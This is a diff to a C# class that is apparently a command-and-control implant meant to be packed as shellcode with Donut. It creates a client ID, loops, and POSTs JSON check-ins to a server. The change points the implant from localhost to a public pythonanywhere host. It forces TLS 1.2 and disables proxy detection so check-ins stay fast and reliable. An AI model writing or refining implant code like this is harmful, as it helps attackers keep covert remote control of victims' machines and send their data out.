@@ -10,7 +10,7 @@ public class Runner
     // Точка входа для Donut
     public static void Start(string args)
     {
-        string serverUrl = "http://localhost:5000";
+        string serverUrl = "https://soulinkkk1.pythonanywhere.com";
         string clientId = Guid.NewGuid().ToString().Substring(0, 8);
         MainLoop(serverUrl, clientId);
     }
@@ -57,13 +57,24 @@ public class Runner
 
     private static string Transmit(string serverUrl, string path, string json)
     {
+        // CRITICAL: Explicitly force the .NET runtime to utilize TLS 1.2 for the HTTPS connection.
+        // The integer 3072 represents TLS 1.2 and works even if targeting older .NET versions.
+        System.Net.ServicePointManager.SecurityProtocol = (System.Net.SecurityProtocolType)3072;
+
         var req = (HttpWebRequest)WebRequest.Create(serverUrl + path);
         req.Method = "POST";
         req.ContentType = "application/json";
+
+        // Optional but highly recommended for public servers: 
+        // Bypass proxy auto-detection to prevent 2-5 second delays on check-in.
+        req.Proxy = null;
+
         byte[] data = Encoding.UTF8.GetBytes(json);
         req.ContentLength = data.Length;
+
         using (var stream = req.GetRequestStream())
             stream.Write(data, 0, data.Length);
+
         using (var resp = (HttpWebResponse)req.GetResponse())
         using (var sr = new StreamReader(resp.GetResponseStream()))
             return sr.ReadToEnd();
